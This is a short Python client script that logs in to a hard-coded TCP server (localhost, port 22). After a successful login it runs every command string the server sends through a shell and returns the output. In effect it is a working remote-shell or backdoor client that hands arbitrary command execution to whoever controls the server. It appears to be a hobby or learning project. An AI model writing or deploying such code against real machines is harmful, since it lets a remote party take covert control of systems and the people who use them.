import socket
import json
import subprocess
import os

ip_server = '127.0.0.1' 
port_server = 22

def handler_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        
        return output
        
    except Exception as e:
        return str(e).encode()

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip_server, port_server))

        msg = sock.recv(1024).decode()
        print(f"Server says: {msg}")#Login or Create format
        choice = input("Your choice (Login/Create): ")
        sock.send(choice.encode())

        format_msg = sock.recv(1024).decode()
        print(f"Fill the fields: {format_msg}")#info json format
        
        name = input("Enter Name: ")
        password = input("Enter Password: ")
        
        auth_data = json.dumps({"name": name, "password": password})
        sock.send(auth_data.encode())

        final_answer = sock.recv(2048).decode()#pass or not
        print(f"Final Status: {final_answer}")
        
        if "successfully" in final_answer.lower():
            while True:
                command_from_server = sock.recv(1024).decode()
                if command_from_server.lower() == 'exit':
                    break
                
                result = handler_command(command_from_server)
                sock.send(result)

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        sock.close()